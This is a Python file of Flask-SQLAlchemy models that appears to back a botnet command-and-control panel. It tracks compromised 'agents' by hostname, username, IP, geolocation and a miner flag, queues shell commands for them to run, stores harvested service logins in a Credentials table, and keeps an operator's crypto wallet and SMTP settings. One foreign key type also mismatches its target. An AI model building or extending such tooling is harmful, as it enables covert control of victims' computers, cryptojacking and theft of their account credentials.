import random
import string
import base64
from datetime import datetime
from flask_sqlalchemy import SQLAlchemy
from flask_httpauth import HTTPBasicAuth


auth = HTTPBasicAuth()

db = SQLAlchemy()


class Agent(db.Model):
    __tablename__ = 'agents'
    id = db.Column(db.String(100), primary_key=True)
    display_name = db.Column(db.String(100))
    last_online = db.Column(db.DateTime())
    operating_system = db.Column(db.String(100))
    cpu = db.Column(db.String(100))
    gpu = db.Column(db.String(100))
    memory = db.Column(db.String(100))
    remote_ip = db.Column(db.String(100))
    geolocation = db.Column(db.String(100))
    output = db.Column(db.Text(), default="")
    hostname = db.Column(db.String(100))
    username = db.Column(db.String(100))
    miner = db.Column(db.CHAR(1),default="")
    
  
    def __init__(self, uid):
        self.id = uid
        self.display_name = base64.b16decode(self.id)

    def push_command(self, cmdline):
        cmd = Command()
        cmd.agent = self
        cmd.cmdline = cmdline
        cmd.timestamp = datetime.now()
        db.session.add(cmd)
        db.session.commit()

    def rename(self, new_name):
        self.display_name = new_name
        db.session.commit()

    def is_online(self):        
        return (datetime.now() - self.last_online).seconds < 30


class Command(db.Model):
    __tablename__ = 'commands'
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    agent_id = db.Column(db.Integer(), db.ForeignKey('agents.id'))
    agent = db.relationship('Agent', backref=db.backref('commands', lazy='dynamic'))
    cmdline = db.Column(db.String(255))
    timestamp = db.Column(db.DateTime(), default=datetime.now)


class Credentials(db.Model):
    __tablename__ = 'credentials'
    id = db.Column(db.Integer(), primary_key=True)
    service = db.Column(db.String(255))
    email = db.Column(db.String(255))
    password = db.Column(db.String(100))

    def __init__(self,service,email,password):        
        self.service = service
        self.email = email
        self.password = password


class Users_config(db.Model):
    __tablename__ = 'users_config'
    id = db.Column(db.Integer(), primary_key=True)
    username = db.Column(db.String(255))
    password = db.Column(db.String(255))
    email = db.Column(db.String(100))
    password_email = db.Column(db.String(100))
    smtp = db.Column(db.String(100))
    wallet = db.Column(db.String(100))
    value_scheduled = db.Column(db.String(100))
    port = db.Column(db.Integer())

    def __init__(self,username,password,email,smtp,password_email,wallet,port,value_scheduled):        
        self.username = username
        self.password = password
        self.wallet = wallet
        self.value_scheduled = value_scheduled
        self.email = email
        self.smtp = smtp
        self.port = port
        self.password_email = password_email